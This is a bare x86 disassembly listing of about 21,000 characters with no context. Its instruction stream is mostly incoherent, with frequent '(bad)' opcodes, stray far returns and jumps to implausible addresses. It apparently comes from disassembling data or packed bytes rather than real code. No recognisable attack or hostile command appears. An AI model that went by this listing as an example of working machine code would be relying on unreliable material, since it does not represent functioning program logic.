  40a4db:	lds    ecx,FWORD PTR [ebx+0x2ad8e8]
  40a4e1:	add    BYTE PTR [ebp-0x3b375],cl
  40a4e7:	adc    BYTE PTR [edx+0x1],0x55
  40a4eb:	add    BYTE PTR [ebx+0x6c8c30],cl
  40a4f1:	add    BYTE PTR [ebx-0x778afc7b],cl
  40a4f7:	mov    eax,DWORD PTR [eax]
  40a4f9:	cld    
  40a4fa:	push   0x7d
  40a4fc:	dec    DWORD PTR [ebx+0xd88c]
  40a502:	push   edx
  40a503:	mov    edx,DWORD PTR [ecx-0x4]
  40a506:	call   DWORD PTR [eax+0x7d01fc]
  40a50c:	mov    ecx,DWORD PTR [ebx+0x509000fc]
  40a512:	add    DWORD PTR [esi+0x0],edx
  40a515:	test   DWORD PTR [ebp+0x75],eax
  40a518:	call   0xc83d85a8
  40a51d:	jge    0x40a4b3
  40a51f:	mov    ebp,ebx
  40a521:	fcom   st(7)
  40a523:	add    bh,al
  40a525:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  40a52b:	add    edi,edi
  40a52d:	add    bh,bh
  40a52f:	imul   esp,ecx,0x4550d400
  40a535:	push   esi
  40a536:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40a53c:	test   BYTE PTR [ebx],dh
  40a53e:	aam    0x5
  40a540:	retf   0x4572
  40a543:	add    bl,ah
  40a545:	rcl    ebx,0x84
  40a548:	mov    DWORD PTR [ecx],0x46d1008c
  40a54e:	jl     0x40a550
  40a550:	test   edi,eax
  40a552:	jmp    esp
  40a554:	inc    DWORD PTR [eax]
  40a556:	loope  0x40a558
  40a558:	aam    0x75
  40a55a:	test   DWORD PTR [ebx+0x45fffcff],ecx
  40a560:	out    dx,al
  40a561:	mov    ebp,eax
  40a563:	mov    ah,0x85
  40a565:	add    bh,bh
  40a567:	call   0x114d06b
  40a56c:	retf   0x858b
  40a56f:	cld    
  40a570:	inc    DWORD PTR [eax+0xeb01ff]
  40a576:	out    dx,al
  40a577:	xor    BYTE PTR [ebp-0xff001e],al
  40a57d:	mov    edx,ecx
  40a57f:	cld    
  40a580:	jl     0x40a50b
  40a582:	mov    edx,0x50000001
  40a587:	add    DWORD PTR [ebp+0x45],eax
  40a58a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40a590:	dec    DWORD PTR [ebx-0x3fd80318]
  40a596:	add    BYTE PTR [ebp-0xbf0040],dl
  40a59c:	inc    ebp
  40a59d:	xor    DWORD PTR [ebx-0x4faf0400],ecx
  40a5a3:	inc    ebp
  40a5a4:	add    DWORD PTR [ebx+0x459c00],ecx
  40a5aa:	mov    edi,edi
  40a5ac:	mov    eax,0xe80800ff
  40a5b1:	inc    ebp
  40a5b2:	sub    cl,BYTE PTR [ebx-0x47000400]
  40a5b8:	add    al,0x1
  40a5ba:	rol    BYTE PTR [eax],0x1e
  40a5bd:	jne    0x40a604
  40a5bf:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40a5c5:	inc    DWORD PTR [ecx]
  40a5c7:	call   0x85cfcc
  40a5cc:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40a5d2:	call   0x40cfd8
  40a5d7:	xor    bh,bh
  40a5d9:	push   edi
  40a5da:	adc    BYTE PTR [ebx-0x747423bb],al
  40a5e0:	loopne 0x40a5be
  40a5e2:	ret    
  40a5e3:	loopne 0x40a583
  40a5e5:	xor    DWORD PTR [edx],0x31
  40a5e8:	cmp    edi,edi
  40a5ea:	bswap  esp
  40a5ec:	rol    BYTE PTR gs:[eax],0x5
  40a5f0:	jmp    0x12ba73a
  40a5f5:	mov    eax,DWORD PTR [ebp-0x4]
  40a5f8:	add    BYTE PTR [eax+0xff0100],bh
  40a5fe:	cld    
  40a5ff:	jne    0x40a67e
  40a601:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40a607:	mov    DWORD PTR [ecx],0x30500000
  40a60d:	inc    ebp
  40a60e:	add    BYTE PTR [ebx+0x459850],cl
  40a614:	mov    edi,edi
  40a616:	test   al,0xff
  40a618:	add    BYTE PTR [eax],cl
  40a61a:	inc    DWORD PTR [ebp-0x18]
  40a61d:	jmp    DWORD PTR [esi]
  40a61f:	fadd   QWORD PTR [eax]
  40a621:	jge    0x40a670
  40a623:	adc    BYTE PTR [ebx+0x459cb9],cl
  40a629:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40a62f:	sahf   
  40a630:	mov    eax,0x30132
  40a635:	lea    esi,[ebp+0x2c]
  40a638:	xor    edi,edi
  40a63a:	(bad)  
  40a63b:	call   0x13fcfa8
  40a640:	call   0x134d0d0
  40a645:	jne    0x40a5d2
  40a647:	xor    edi,esp
  40a649:	add    eax,DWORD PTR [eax+0xc018d]
  40a64f:	push   DWORD PTR [eax]
  40a651:	call   0xc9cfad
  40a656:	int3   
  40a657:	inc    DWORD PTR [ebp-0x14]
  40a65a:	mov    ecx,DWORD PTR [ebp-0x28]
  40a65d:	xor    eax,DWORD PTR [eax]
  40a65f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40a665:	(bad)  
  40a666:	xchg   ebp,eax
  40a667:	in     al,0xff
  40a669:	add    bh,bh
  40a66b:	add    BYTE PTR [esi],al
  40a66d:	inc    ebp
  40a66e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40a674:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  40a67b:	mov    edi,edi
  40a67d:	or     BYTE PTR [eax],cl
  40a67f:	inc    ebp
  40a680:	test   DWORD PTR gs:[eax],eax
  40a683:	je     0x40a6ca
  40a685:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40a68b:	xor    edx,DWORD PTR [eax-0x73]
  40a68e:	push   ebp
  40a68f:	or     BYTE PTR [ebp+0x21007572],al
  40a695:	inc    ebp
  40a696:	in     al,dx
  40a697:	mov    ebp,DWORD PTR [eax]
  40a699:	mov    esp,0x628bc345
  40a69e:	fmul   st,st(5)
  40a6a0:	add    BYTE PTR [ebx],ch
  40a6a2:	mov    eax,DWORD PTR [ebx]
  40a6a4:	cld    
  40a6a5:	loopne 0x40a667
  40a6a7:	inc    ebp
  40a6a8:	push   ebp
  40a6a9:	cmp    ebp,eax
  40a6ab:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  40a6b2:	cld    
  40a6b3:	fadd   DWORD PTR [eax+0x3b014d]
  40a6b9:	jne    0x40a6eb
  40a6bb:	push   0xf8898557
  40a6c0:	in     al,dx
  40a6c1:	jne    0x40a708
  40a6c3:	lea    eax,[ebx+0x72e8dcc8]
  40a6c9:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  40a6cf:	jmp    0x40a704
  40a6d1:	mov    edi,DWORD PTR [edi+0x4572bc]
  40a6d7:	xor    eax,edi
  40a6d9:	adc    DWORD PTR [ebp-0xcd0062],0x8b9231
  40a6e3:	rcl    BYTE PTR [eax-0x40],1
  40a6e6:	inc    ebp
  40a6e7:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40a6ef:	inc    ebp
  40a6f0:	xchg   ebp,eax
  40a6f1:	ud0    ebp,DWORD PTR [ebx]
  40a6f4:	inc    DWORD PTR [eax]
  40a6f6:	jl     0x40a76e
  40a6f8:	add    BYTE PTR [edx+0x1f558050],cl
  40a6fe:	mov    ecx,DWORD PTR [esp+esi*8]
  40a701:	inc    eax
  40a702:	retf   
  40a703:	inc    ebp
  40a704:	iret   
  40a705:	jb     0x40a6cf
  40a707:	mov    eax,DWORD PTR [edi]
  40a709:	enter  0x4545,0x1
  40a70d:	xor    eax,0x898b9c00
  40a712:	mov    esp,0x33344df0
  40a717:	pushf  
  40a718:	lea    ecx,[ecx+0x4d72e008]
  40a71e:	add    BYTE PTR [ebx],dh
  40a720:	inc    ebp
  40a721:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  40a727:	xor    dl,BYTE PTR [edx]
  40a729:	add    eax,DWORD PTR [ebp-0x77]
  40a72c:	mov    eax,esp
  40a72e:	fmul   DWORD PTR [ebp-0x3d]
  40a731:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  40a738:	mov    DWORD PTR [ebp-0x28],eax
  40a73b:	aad    0x45
  40a73d:	pushf  
  40a73e:	xor    eax,edi
  40a740:	mov    ecx,0xff858db0
  40a745:	clc    
  40a746:	enter  0x4d45,0x32
  40a74a:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40a751:	test   esi,edi
  40a753:	clc    
  40a754:	inc    DWORD PTR [ebp+0x45]
  40a757:	xor    BYTE PTR [ebx-0x3738f764],cl
  40a75d:	test   al,0x16
  40a75f:	test   DWORD PTR ds:0xff459cf8,esi
  40a765:	ds cld 
  40a767:	pushf  
  40a768:	inc    ebp
  40a769:	mov    edx,DWORD PTR [eax-0x28]
  40a76c:	outs   dx,DWORD PTR ds:[esi]
  40a76d:	push   ebp
  40a76e:	add    BYTE PTR [ebx],dh
  40a770:	mov    DWORD PTR [ebx],eax
  40a772:	sar    BYTE PTR [ebx],1
  40a774:	adc    BYTE PTR [edi],cl
  40a776:	dec    ebp
  40a777:	adc    al,0x8b
  40a779:	add    al,dl
  40a77b:	jmp    0x101a94b
  40a780:	jb     0x40a7cf
  40a782:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40a788:	xor    ecx,DWORD PTR [ebp+0x3b]
  40a78b:	xor    ecx,DWORD PTR [edi]
  40a78d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40a791:	(bad)  
  40a793:	clc    
  40a794:	enter  0x8400,0x8b
  40a798:	pop    es
  40a799:	mov    al,0x0
  40a79b:	push   ebp
  40a79c:	push   cs
  40a79d:	xor    ecx,eax
  40a79f:	xor    esp,ecx
  40a7a1:	add    ebp,DWORD PTR [eax]
  40a7a3:	add    esi,DWORD PTR [eax]
  40a7a5:	(bad)  
  40a7a7:	retf   0x55c8
  40a7aa:	repnz mov eax,DWORD PTR [ebp-0x10]
  40a7ae:	(bad)  
  40a7af:	cli    
  40a7b0:	fdivr  st,st(1)
  40a7b2:	test   DWORD PTR [eax+edi*8],ecx
  40a7b5:	dec    ebp
  40a7b6:	inc    ebp
  40a7b7:	xor    edi,DWORD PTR [eax-0x7167afd]
  40a7bd:	add    BYTE PTR [ebp+0x0],al
  40a7c0:	mov    ecx,DWORD PTR [ebp-0x28]
  40a7c3:	mov    ecx,ebx
  40a7c5:	clc    
  40a7c6:	jne    0x40a793
  40a7c8:	mov    esi,0xd672d3
  40a7cd:	into   
  40a7ce:	into   
  40a7cf:	scas   eax,DWORD PTR es:[edi]
  40a7d0:	dec    ebp
  40a7d1:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40a7d7:	sub    ecx,esi
  40a7d9:	cmp    ecx,DWORD PTR [ebp+0x77]
  40a7dc:	(bad)  
  40a7dd:	mov    edi,eax
  40a7df:	mov    al,0x85
  40a7e1:	mov    eax,edi
  40a7e3:	add    BYTE PTR [ebp-0x75],al
  40a7e6:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40a7ed:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40a7f3:	rdtsc  
  40a7f5:	retf   0x559c
  40a7f8:	(bad)  
  40a7f9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40a800:	inc    ebp
  40a801:	add    eax,0xeb9c4d3f
  40a806:	(bad)  
  40a807:	mov    ecx,esp
  40a809:	lods   al,BYTE PTR ds:[esi]
  40a80a:	test   DWORD PTR [ebp-0x8],edx
  40a80d:	xor    ecx,DWORD PTR [ebp+0x33]
  40a810:	mov    eax,DWORD PTR [ebx]
  40a812:	lock add ecx,ebx
  40a815:	bswap  esi
  40a817:	retf   0x55d1
  40a81a:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40a820:	jmp    0x40a81b
  40a822:	add    BYTE PTR ds:0xebc44d8b,al
  40a828:	push   ebp
  40a829:	mov    ebp,DWORD PTR [ebx]
  40a82b:	test   al,0x8b
  40a82d:	push   ebp
  40a82e:	clc    
  40a82f:	xor    ecx,ebx
  40a831:	xor    ecx,esi
  40a833:	add    edx,ecx
  40a835:	add    eax,DWORD PTR [edx+0xca010f]
  40a83b:	push   ebp
  40a83c:	dec    ebp
  40a83d:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40a843:	stc    
  40a844:	rol    DWORD PTR ds:0xebce4dd6,cl
  40a84a:	scas   eax,DWORD PTR es:[edi]
  40a84b:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40a851:	xor    ebp,DWORD PTR [ebx]
  40a853:	xor    edi,DWORD PTR [ebx]
  40a855:	add    esi,DWORD PTR [edi+0x3]
  40a858:	mov    ecx,DWORD PTR [edi]
  40a85a:	clc    
  40a85b:	retf   0x55cb
  40a85e:	into   
  40a85f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40a866:	mov    eax,0x3376554d
  40a86b:	mov    esi,DWORD PTR [ebx]
  40a86d:	int3   
  40a86e:	add    edx,DWORD PTR [ebp+0x3]
  40a871:	xor    ecx,DWORD PTR [edi]
  40a873:	xor    ecx,edx
  40a875:	add    edx,DWORD PTR [ebp+0x3]
  40a878:	mov    ecx,DWORD PTR [edi]
  40a87a:	lock retf 0x4dfa
  40a87e:	stc    
  40a87f:	mov    ecx,DWORD PTR [eax]
  40a881:	or     BYTE PTR [ebp+0x4d],cl
  40a884:	jmp    0x104a914
  40a889:	dec    ebp
  40a88a:	dec    ebp
  40a88b:	(bad)  
  40a88c:	mov    ebx,esp
  40a88e:	clc    
  40a88f:	test   ebx,ecx
  40a891:	clc    
  40a892:	ror    DWORD PTR [ebp-0x2a],cl
  40a895:	mov    esi,ecx
  40a897:	call   0x33cbee4b
  40a89c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40a8a3:	retf   
  40a8a4:	ja     0x40a874
  40a8a6:	mov    ebp,DWORD PTR [eax-0x48]
  40a8a9:	dec    ebp
  40a8aa:	xor    ecx,DWORD PTR [di+0x3]
  40a8ae:	mov    esp,esp
  40a8b0:	clc    
  40a8b1:	push   ebp
  40a8b2:	retf   
  40a8b3:	mov    dl,bl
  40a8b5:	adc    esi,edx
  40a8b7:	jb     0x40a887
  40a8b9:	add    BYTE PTR [edi-0x3b7474b3],ch
  40a8bf:	call   0x4d6c7441
  40a8c4:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40a8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8cb:	sahf   
  40a8cc:	inc    ebp
  40a8cd:	xor    cl,BYTE PTR [ebp-0x78]
  40a8d0:	mov    edx,edi
  40a8d2:	clc    
  40a8d3:	dec    ebp
  40a8d4:	retf   
  40a8d5:	mov    edx,ebx
  40a8d7:	call   0x560f7cb2
  40a8dc:	scas   eax,DWORD PTR es:[edi]
  40a8dd:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40a8e3:	sahf   
  40a8e4:	sub    esi,DWORD PTR [edx]
  40a8e6:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40a8ec:	lods   al,BYTE PTR ds:[esi]
  40a8ed:	xor    esp,DWORD PTR [ebx]
  40a8ef:	add    ecx,DWORD PTR [ebp-0x1c]
  40a8f2:	mov    edi,DWORD PTR [ebp-0x8]
  40a8f5:	mov    bl,cl
  40a8f7:	cmp    dl,bl
  40a8f9:	jb     0x40a8c9
  40a8fb:	add    dh,dl
  40a8fd:	dec    ebp
  40a8fe:	scas   eax,DWORD PTR es:[edi]
  40a8ff:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40a905:	shr    DWORD PTR [ebx],cl
  40a907:	into   
  40a908:	cmp    edx,esi
  40a90a:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40a910:	dec    ebp
  40a911:	dec    ebp
  40a912:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40a918:	retf   
  40a919:	xor    edx,esi
  40a91b:	add    ecx,esi
  40a91d:	imul   ecx,edx
  40a920:	mov    DWORD PTR [ebp+0x8],edx
  40a923:	xor    ecx,DWORD PTR [ebp+0x2b]
  40a926:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40a92c:	add    esi,DWORD PTR [ebx]
  40a92e:	mov    ah,0x3
  40a930:	inc    ebp
  40a931:	sysexit 
  40a933:	xlat   BYTE PTR ds:[ebx]
  40a934:	pushf  
  40a935:	jge    0x40a8c0
  40a937:	xor    ebx,eax
  40a939:	sub    eax,DWORD PTR [ebp-0x73]
  40a93c:	(bad)  
  40a93d:	cmp    al,al
  40a93f:	jb     0x40a8c6
  40a941:	add    al,bh
  40a943:	ror    DWORD PTR [ebp-0x7a],1
  40a946:	xor    edi,edi
  40a948:	add    edi,edi
  40a94a:	jmp    0x40a999
  40a94c:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40a952:	dec    ebp
  40a953:	into   
  40a954:	mov    ebp,DWORD PTR [edi-0x23737428]
  40a95a:	sahf   
  40a95b:	shl    DWORD PTR [edx],cl
  40a95d:	retf   0x5588
  40a960:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40a966:	add    eax,DWORD PTR [eax]
  40a968:	in     al,0x4d
  40a96a:	push   ebp
  40a96b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40a971:	bound  eax,QWORD PTR [eax]
  40a973:	int    0x4d
  40a975:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40a97b:	dec    ebp
  40a97c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40a982:	jge    0x40a952
  40a984:	mov    BYTE PTR [edi+0xf723b3a],ch
  40a98a:	add    cl,dh
  40a98c:	dec    ebp
  40a98d:	dec    DWORD PTR [ebx-0x2c032375]
  40a993:	adc    BYTE PTR [ebp+0x1],0x8b
  40a997:	add    al,bl
  40a999:	jge    0x40a927
  40a99b:	push   0xffffff9e
  40a99d:	push   0x8b3032
  40a9a2:	shl    BYTE PTR [ebp+0x55],0x6a
  40a9a6:	xor    edi,edi
  40a9a8:	xor    edx,DWORD PTR [ebx+eax*1]
  40a9ab:	inc    ebp
  40a9ac:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40a9b2:	dec    ebp
  40a9b3:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40a9b9:	jbe    0x40a946
  40a9bb:	mov    ebp,esp
  40a9bd:	ror    bl,1
  40a9bf:	enter  0x14ce,0xaf
  40a9c3:	dec    DWORD PTR [ebx-0x2cef17f8]
  40a9c9:	push   ebp
  40a9ca:	retf   0x5540
  40a9cd:	push   ebp
  40a9ce:	mov    esi,DWORD PTR [edx-0x1c]
  40a9d1:	mov    edx,ebx
  40a9d3:	cld    
  40a9d4:	(bad)  
  40a9d5:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40a9dc:	sti    
  40a9dd:	add    dh,cl
  40a9df:	push   0xffffff94
  40a9e1:	call   FWORD PTR [esi+0x3b5032d0]
  40a9e7:	mov    ecx,DWORD PTR [edi]
  40a9e9:	int3   
  40a9ea:	pop    esi
  40a9eb:	inc    ebp
  40a9ec:	dec    DWORD PTR [ecx+0x45e8c88b]
  40a9f2:	push   ebp
  40a9f3:	xor    esi,DWORD PTR [ebx]
  40a9f5:	mov    DWORD PTR [ebx],0xcacc0f9c
  40a9fb:	aas    
  40a9fc:	push   ebp
  40a9fd:	inc    ebp
  40a9fe:	xor    eax,esp
  40aa00:	add    eax,esp
  40aa02:	mov    eax,DWORD PTR [ebx]
  40aa04:	(bad)  
  40aa05:	jmp    0x40a993
  40aa07:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  40aa0d:	rol    ah,1
  40aa0f:	mov    esi,0xf133104d
  40aa14:	mov    edx,0xff358d80
  40aa19:	mov    dh,0xd1
  40aa1b:	cmp    edx,DWORD PTR [ebp+0xf]
  40aa1e:	mov    eax,DWORD PTR [edx-0x20]
  40aa21:	add    BYTE PTR [ebp-0x75],bh
  40aa24:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40aa2b:	sahf   
  40aa2c:	retf   0x8632
  40aa2f:	cmp    ebp,0x8
  40aa32:	call   ebx
  40aa34:	inc    ebp
  40aa35:	inc    ebp
  40aa36:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40aa3c:	mov    esi,DWORD PTR ds:0xc7049cc8
  40aa42:	add    al,al
  40aa44:	add    bl,al
  40aa46:	(bad)  
  40aa47:	clc    
  40aa48:	enter  0x45,0x35
  40aa4c:	push   eax
  40aa4d:	pushf  
  40aa4e:	mov    edi,eax
  40aa50:	int3   
  40aa51:	or     al,al
  40aa53:	test   DWORD PTR [edi],edi
  40aa55:	clc    
  40aa56:	gs inc ebp
  40aa58:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40aa5e:	push   ss
  40aa5f:	xor    ecx,DWORD PTR [ebp+0x3]
  40aa62:	sub    edx,DWORD PTR [ecx-0x76]
  40aa65:	dec    ebp
  40aa66:	add    DWORD PTR [ebx+0x88d845],ecx
  40aa6c:	mov    esi,DWORD PTR [ebx]
  40aa6e:	or     BYTE PTR [ebx],al
  40aa70:	cmp    edx,DWORD PTR [ecx-0x38]
  40aa73:	dec    ebp
  40aa74:	out    dx,eax
  40aa75:	xor    eax,DWORD PTR [ebp+0x3]
  40aa78:	mov    edx,DWORD PTR [ecx-0x28]
  40aa7b:	dec    ebp
  40aa7c:	add    BYTE PTR [ebx],dh
  40aa7e:	push   0x518003
  40aa83:	push   eax
  40aa84:	add    BYTE PTR [ebx-0x300748b],cl
  40aa8a:	sbb    BYTE PTR [ebp+0x45],cl
  40aa8d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40aa93:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40aa99:	dec    ebp
  40aa9a:	inc    ebp
  40aa9b:	xor    eax,esp
  40aa9d:	add    eax,esp
  40aa9f:	push   ecx
  40aaa0:	(bad)  
  40aaa1:	dec    ebp
  40aaa2:	mov    al,ds:0xc9e031ff
  40aaa7:	retf   
  40aaa8:	(bad)  
  40aaa9:	into   
  40aaaa:	sub    bh,bh
  40aaac:	dec    esp
  40aaad:	adc    al,0x9c
  40aaaf:	inc    ebp
  40aab0:	push   ebp
  40aab1:	test   DWORD PTR [edi],ecx
  40aab3:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  40aaba:	jmp    0xc9b9b9ce
  40aabf:	add    cl,dl
  40aac1:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40aacb:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40aad1:	rol    BYTE PTR [eax],0x57
  40aad4:	clc    
  40aad5:	bound  esi,QWORD PTR [edx+0x7]
  40aad8:	mov    eax,DWORD PTR [ebp-0x30]
  40aadb:	xor    al,0x40
  40aadd:	sub    al,0xc7
  40aadf:	mov    ah,ch
  40aae1:	add    DWORD PTR [ebp+0x4534f845],eax
  40aae7:	sub    al,0x86
  40aae9:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40aaf0:	mov    ch,0xff
  40aaf2:	clc    
  40aaf3:	add    DWORD PTR [ebp+0x60],0x31
  40aaf7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40aafe:	inc    ebp
  40aaff:	dec    DWORD PTR [ebx-0x341ff701]
  40ab05:	test   esi,ecx
  40ab07:	dec    DWORD PTR [ebx-0x7f8a3301]
  40ab0d:	push   eax
  40ab0e:	add    DWORD PTR [ebp+0x0],eax
  40ab11:	dec    ebx
  40ab13:	or     al,0xce
  40ab15:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40ab1c:	into   
  40ab1d:	add    BYTE PTR [ebx-0x34ff1400],cl
  40ab23:	mov    esi,ecx
  40ab25:	sar    bh,0x45
  40ab28:	adc    al,0x8b
  40ab2a:	clc    
  40ab2b:	fadd   DWORD PTR [ebp+0x0]
  40ab2e:	mov    ebp,DWORD PTR [edx+0x8]
  40ab31:	push   edi
  40ab32:	adc    BYTE PTR [eax+0x1],0x83
  40ab36:	add    al,al
  40ab38:	retf   
  40ab39:	mov    ecx,esi
  40ab3b:	cld    
  40ab3c:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40ab42:	into   
  40ab43:	add    BYTE PTR [ebx+0x756aec00],cl
  40ab49:	jne    0x40ab7e
  40ab4b:	inc    DWORD PTR [ebx]
  40ab4d:	rcl    BYTE PTR [ecx+0x50],1
  40ab50:	push   eax
  40ab51:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40ab57:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40ab5e:	sar    bh,0x84
  40ab61:	or     BYTE PTR [ebx],al
  40ab63:	push   eax
  40ab64:	add    BYTE PTR [ebx+0x4532c845],cl
  40ab6a:	pushf  
  40ab6b:	xor    eax,0x89b49cc7
  40ab70:	test   eax,ebp
  40ab72:	clc    
  40ab73:	inc    ebp
  40ab74:	inc    ebp
  40ab75:	mov    DWORD PTR [eax+eax*8],esi
  40ab78:	sub    al,0x34
  40ab7a:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  40ab81:	dec    ebp
  40ab82:	bound  esi,QWORD PTR [ebx]
  40ab84:	inc    edi
  40ab85:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  40ab8b:	dec    ebp
  40ab8c:	bound  esi,QWORD PTR [ebx]
  40ab8e:	inc    edi
  40ab8f:	add    eax,DWORD PTR [ebx-0xf7a377]
  40ab95:	inc    ebp
  40ab96:	add    ch,dl
  40ab98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab99:	pushf  
  40ab9a:	inc    edi
  40ab9c:	dec    esp
  40ab9e:	lea    eax,[ebp+0x45fff860]
  40aba4:	push   eax
  40aba5:	xor    dh,BYTE PTR [ebp-0x64]
  40aba8:	(bad)  
  40aba9:	(bad)  
  40abaa:	pop    esp
  40abab:	lods   al,BYTE PTR ds:[esi]
  40abac:	inc    DWORD PTR [ebp+0x4508f8ff]
  40abb2:	mov    esi,DWORD PTR [eax]
  40abb4:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40abbb:	test   DWORD PTR [edi-0x8],edx
  40abbe:	inc    esi
  40abbf:	inc    ebp
  40abc0:	add    BYTE PTR [esi],bh
  40abc2:	push   0x8b809c
  40abc7:	in     al,dx
  40abc8:	inc    ebp
  40abc9:	push   ebp
  40abca:	mov    esi,DWORD PTR [ebx]
  40abcc:	cld    
  40abcd:	add    eax,DWORD PTR [eax+0xf013b]
  40abd3:	adc    al,0x0
  40abd5:	add    bh,bh
  40abd7:	jmp    0xbdacf4
  40abdc:	add    BYTE PTR [ebp+0x45],cl
  40abdf:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40abe5:	dec    ebp
  40abe6:	push   0x38033
  40abeb:	cmp    eax,DWORD PTR [eax]
  40abed:	unpcklps xmm7,xmm0
  40abf0:	jne    0x40abf2
  40abf2:	dec    DWORD PTR [ebx+0x5545cc18]
  40abf8:	mov    DWORD PTR [ebx],esi
  40abfa:	shl    BYTE PTR [ebx],1
  40abfc:	inc    ebp
  40abfd:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40ac03:	retf   0x5575
  40ac06:	dec    DWORD PTR [ebx-0x5ba17e8]
  40ac0c:	(bad)  
  40ac0d:	stc    
  40ac0e:	in     al,dx
  40ac0f:	or     al,0x85
  40ac11:	dec    ebp
  40ac12:	clc    
  40ac13:	xor    eax,DWORD PTR [ebp+0x3]
  40ac16:	mov    ebp,ecx
  40ac18:	rol    BYTE PTR [eax],1
  40ac1a:	inc    ebp
  40ac1b:	add    BYTE PTR [eax-0x7747ab3],bh
  40ac21:	clc    
  40ac22:	inc    ebp
  40ac23:	retf   
  40ac24:	mov    edx,ebx
  40ac26:	in     al,dx
  40ac27:	(bad)  
  40ac28:	retf   
  40ac29:	into   
  40ac2a:	into   
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	dec    ebp
  40ac2d:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40ac33:	sub    ecx,esi
  40ac35:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ac38:	(bad)  
  40ac39:	mov    edi,eax
  40ac3b:	int3   
  40ac3c:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ac42:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ac49:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ac4f:	rdtsc  
  40ac51:	retf   0x559c
  40ac54:	(bad)  
  40ac55:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ac5c:	inc    ebp
  40ac5d:	add    eax,0xeb9c4d3f
  40ac62:	(bad)  
  40ac63:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ac69:	xor    ecx,DWORD PTR [ebp+0x33]
  40ac6c:	mov    eax,DWORD PTR [ebx]
  40ac6e:	call   0xce507776
  40ac73:	retf   0x55d1
  40ac76:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ac7c:	jmp    0x40ac77
  40ac7e:	add    BYTE PTR ds:0xebf44d8b,al
  40ac84:	push   ebp
  40ac85:	mov    ebp,DWORD PTR [ebx]
  40ac87:	mov    eax,0x33f8558b
  40ac8c:	retf   
  40ac8d:	xor    ecx,esi
  40ac8f:	add    edx,ecx
  40ac91:	add    eax,DWORD PTR [edx+0xca010f]
  40ac97:	push   ebp
  40ac98:	dec    ebp
  40ac99:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ac9f:	stc    
  40aca0:	rol    DWORD PTR ds:0xebce4dd6,cl
  40aca6:	scas   eax,DWORD PTR es:[edi]
  40aca7:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40acad:	xor    ebp,DWORD PTR [ebx]
